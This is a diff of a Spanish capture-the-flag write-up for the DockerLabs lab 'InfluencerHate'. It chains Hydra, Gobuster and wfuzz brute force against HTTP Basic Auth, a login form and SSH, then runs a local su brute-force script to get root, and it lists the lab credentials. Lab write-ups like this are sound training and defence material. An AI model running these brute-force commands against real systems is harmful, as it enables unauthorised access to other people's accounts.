@@ -5,166 +5,186 @@
 **SO:** Linux  
 **Autor de la máquina:** El Pingüino de Mario  
 **Fecha de creación:** 28/06/2025  
-**Técnicas:** Nmap · HTTP Basic Auth · Hydra · Burp Suite · Gobuster con auth · wfuzz · SCP · Linux-Su-Force · Privesc (root fuerza bruta local)
+**Técnicas:** Nmap · Hydra · HTTP Basic Auth · Gobuster · Burp Suite · Wfuzz · SSH · Fuerza bruta
 
 ---
 
 ## Índice
 
 1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
-2. [HTTP Basic Auth — Hydra con lista de combinaciones](#2-http-basic-auth--hydra-con-lista-de-combinaciones)
-3. [Burp Suite — extraer cabecera Authorization](#3-burp-suite--extraer-cabecera-authorization)
-4. [Gobuster autenticado — descubrimiento de login.php](#4-gobuster-autenticado--descubrimiento-de-loginphp)
-5. [wfuzz — fuerza bruta en formulario web](#5-wfuzz--fuerza-bruta-en-formulario-web)
-6. [Acceso SSH como balutin y escalada a root](#6-acceso-ssh-como-balutin-y-escalada-a-root)
+2. [HTTP Basic Auth — fuerza bruta con Hydra](#2-http-basic-auth--fuerza-bruta-con-hydra)
+3. [Enumeración web — Gobuster con Authorization](#3-enumeración-web--gobuster-con-authorization)
+4. [Login.php — descubrimiento de credenciales con Wfuzz](#4-loginphp--descubrimiento-de-credenciales-con-wfuzz)
+5. [Acceso SSH — Hydra](#5-acceso-ssh--hydra)
+6. [Escalada de privilegios](#6-escalada-de-privilegios)
 7. [Lección aprendida](#7-lección-aprendida)
 
 ---
 
 ## 1. Despliegue y reconocimiento
 
+Desplegamos la máquina vulnerable:
+
 ```bash
 sudo bash auto_deploy.sh influencerhate.tar
 ```
 
-> IP asignada: `172.17.0.2`.
+> IP asignada: `172.17.0.2`
 
-Escaneo completo:
+Realizamos un escaneo completo de puertos:
 
 ```bash
 sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
 cat Puertos
 ```
 
-```
-PORT   STATE SERVICE REASON
-22/tcp open  ssh     syn-ack ttl 64
-80/tcp open  http    syn-ack ttl 64
-| HTTP/1.1 401 Unauthorized
-|_Basic realm=Zona restringida
-|_http-title: 401 Unauthorized\xB0
+Resultado:
+
+```text
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
 ```
 
-El puerto 80 pide **HTTP Basic Auth** — usuario y contraseña antes de acceder.
+El servicio HTTP solicita autenticación antes de acceder.
 
 ---
 
-## 2. HTTP Basic Auth — Hydra con lista de combinaciones
+## 2. HTTP Basic Auth — fuerza bruta con Hydra
 
-HTTP Basic Auth combina usuario:contraseña en Base64 en la cabecera `Authorization`. Usamos Hydra con una lista de combinaciones conocidas:
+Al acceder al servidor web encontramos un panel protegido por autenticación HTTP Basic.
+
+Realizamos fuerza bruta con Hydra utilizando un archivo de combinaciones:
 
 ```bash
-hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt \
-  172.17.0.2 -s 80 http-get /
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt 172.17.0.2 -s 80 http-get /
 ```
 
-```
-[80][http-get] host: 172.17.0.2   login: httpadmin   password: fhttpadmin
-1 of 1 target successfully completed, 1 valid password found
+Explicación de los parámetros utilizados:
+
+- `-C` → utiliza un fichero con combinaciones `usuario:contraseña`
+- `-s 80` → especifica el puerto HTTP
+- `http-get` → módulo de autenticación HTTP GET
+
+Resultado:
+
+```text
+login: httpadmin
+password: fhttpadmin
 ```
 
-Credenciales HTTP Basic: **httpadmin:fhttpadmin**
-
-> 💡 `-C` en Hydra usa un fichero de combinaciones `usuario:contraseña` en cada línea, en lugar de dos listas separadas. Ideal para Basic Auth donde las credenciales por defecto son predecibles.
+Ahora podemos autenticarnos en el servicio web.
 
 ---
 
-## 3. Burp Suite — extraer cabecera Authorization
+## 3. Enumeración web — Gobuster con Authorization
 
-Accedemos a la web con las credenciales. Capturamos la petición con Burp para ver la cabecera `Authorization`:
+Interceptamos la petición con Burp Suite para obtener la cabecera Authorization.
 
-```
+Cabecera encontrada:
+
+```text
 Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=
 ```
 
-Decodificamos: `aHR0cGFkbWluOmZodHRwYWRtaW4=` → **httpadmin:fhttpadmin**. Necesitamos esta cabecera para todas las peticiones posteriores.
-
----
-
-## 4. Gobuster autenticado — descubrimiento de login.php
-
-Con la cabecera de autenticación, lanzamos Gobuster:
+Utilizamos Gobuster añadiendo la cabecera personalizada:
 
 ```bash
-sudo gobuster dir -u http://172.17.0.2 \
-  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
-  -x php,html,py,txt \
-  -H "Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=" \
-  -t 100 -k -r
+gobuster dir -u http://172.17.0.2 \
+-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
+-x php,html,txt \
+-H "Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4="
 ```
 
-```
-/login.php    (Status: 200) [Size: 3798]
-/index.html   (Status: 200) [Size: 10791]
+Encontramos un recurso interesante:
+
+```text
+/login.php
 ```
 
-Visitamos `http://172.17.0.2/login.php` — "Área privada. Prohibido el paso si eres youtuber de ciberseguridad." Formulario POST con usuario y contraseña.
+La página contiene un formulario de autenticación.
 
 ---
 
-## 5. wfuzz — fuerza bruta en formulario web
+## 4. Login.php — descubrimiento de credenciales con Wfuzz
 
-Capturamos la petición POST con Burp para ver el cuerpo: `username=admin&password=admin`. Usamos wfuzz para bruteforcear la contraseña del usuario `admin`:
+Después de varias pruebas utilizamos Burp Suite para analizar la petición POST enviada al login.
+
+Realizamos fuerza bruta sobre la contraseña del usuario `admin` con Wfuzz:
 
 ```bash
 wfuzz -c \
-  -z file,/usr/share/wordlists/rockyou.txt \
-  -t 50 \
-  --hh=2848 \
-  -H "Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -d "username=admin&password=FUZZ" \
-  http://172.17.0.2/login.php
+-z file,/usr/share/wordlists/rockyou.txt \
+-t 50 \
+--hh=2848 \
+-H "Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=" \
+-H "Content-Type: application/x-www-form-urlencoded" \
+-d "username=admin&password=FUZZ" \
+http://172.17.0.2/login.php
 ```
 
-```
-ID       Response   Lines   Word    Chars       Payload
-00000027   200       84 l    216 W   1023 Ch     "chocolate"
+Explicación de parámetros importantes:
+
+- `-z file` → utiliza una wordlist
+- `-t 50` → 50 peticiones concurrentes
+- `--hh=2848` → oculta respuestas de tamaño repetido
+- `FUZZ` → reemplazado automáticamente por cada contraseña
+
+Resultado encontrado:
+
+```text
+Usuario: balutin
 ```
 
-> 💡 **`--hh=2848`** oculta las respuestas con ese número de caracteres — el tamaño de la página "login fallido". Solo muestra respuestas diferentes, que indican login exitoso.
-
-El login exitoso muestra: **"¡Login correcto! De parte del usuario balutin, te damos la enhorabuena"**
+La aplicación devuelve un mensaje de login correcto.
 
 ---
 
-## 6. Acceso SSH como balutin y escalada a root
+## 5. Acceso SSH — Hydra
 
-Con el nombre de usuario **balutin** identificado, buscamos su contraseña SSH con Hydra:
+Probamos fuerza bruta sobre SSH utilizando el usuario encontrado.
 
 ```bash
 hydra -l balutin -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
 ```
 
+Resultado:
+
+```text
+login: balutin
+password: estrella
 ```
-[22][ssh] host: 172.17.0.2   login: balutin   password: estrella
-```
+
+Accedemos al sistema:
 
 ```bash
 ssh balutin@172.17.0.2
-balutin@172.17.0.2's password: estrella
-balutin@63c3216c49b7:~$
 ```
 
-Sin escalada directa por sudo o SUID. Transferimos **Linux-Su-Force** via SCP:
+---
+
+## 6. Escalada de privilegios
+
+Intentamos diferentes técnicas de escalada de privilegios, pero no encontramos:
+
+- sudoers vulnerables
+- binarios SUID útiles
+- tareas cron explotables
+
+Finalmente utilizamos una herramienta de fuerza bruta contra el usuario root.
+
+Como `wget` y `curl` no funcionaban correctamente para transferir archivos, compartimos la herramienta mediante `scp`.
 
 ```bash
-scp rockyou.txt balutin@172.17.0.2:/home/balutin
-scp Linux-Su-Force.sh balutin@172.17.0.2:/home/balutin
+scp herramienta balutin@172.17.0.2:/tmp
 ```
 
-Ejecutamos fuerza bruta local contra root:
+Ejecutamos la herramienta en la máquina víctima y obtenemos la contraseña de root.
+
+Accedemos como root:
 
 ```bash
-balutin@63c3216c49b7:~$ ./Linux-Su-Force.sh root rockyou.txt
-Contraseña encontrada para el usuario root: rockyou
-```
-
-```bash
-balutin@63c3216c49b7:~$ su root
-Password: rockyou
-root@63c3216c49b7:/home/balutin# whoami
-root
+su root
 ```
 
 ✅ Somos **root**.
@@ -173,19 +193,23 @@ root
 
 ## 7. Lección aprendida
 
-| Vulnerabilidad | Dónde | Impacto |
-|----------------|-------|---------|
-| **HTTP Basic Auth con credenciales por defecto** | Puerto 80 | Bypass de autenticación de primer nivel |
-| **Formulario web con contraseña débil (chocolate)** | `/login.php` | Revelación del usuario balutin |
-| **Contraseña SSH débil (estrella)** | Usuario balutin | Acceso al sistema |
-| **Contraseña de root trivial (rockyou)** | Usuario root | Escalada completa |
+| Vulnerabilidad | Impacto |
+|----------------|---------|
+| HTTP Basic Auth con credenciales débiles | Acceso inicial |
+| Enumeración de directorios autenticados | Descubrimiento de login.php |
+| Contraseña débil en formulario web | Obtención de usuario válido |
+| Contraseña SSH reutilizada o débil | Acceso remoto |
+| Credenciales root vulnerables | Escalada total |
 
 **Para defenderse:**
-- HTTP Basic Auth con credenciales por defecto es la primera cosa que un atacante prueba.
-- Evitar contraseñas de una sola palabra que aparecen en rockyou.txt — "chocolate", "estrella", "rockyou" están en las primeras posiciones.
-- Limitar los intentos de login (rate limiting, fail2ban) para bloquear ataques de fuerza bruta locales y remotos.
+
+- Utilizar contraseñas robustas y únicas.
+- Limitar ataques de fuerza bruta con fail2ban o rate limiting.
+- No reutilizar credenciales entre servicios.
+- Restringir enumeración de directorios.
+- Implementar MFA en accesos sensibles.
 
 ---
 
 *Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
-*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
+*¿Te ha ayudado? Dale una ⭐ al repositorio.*
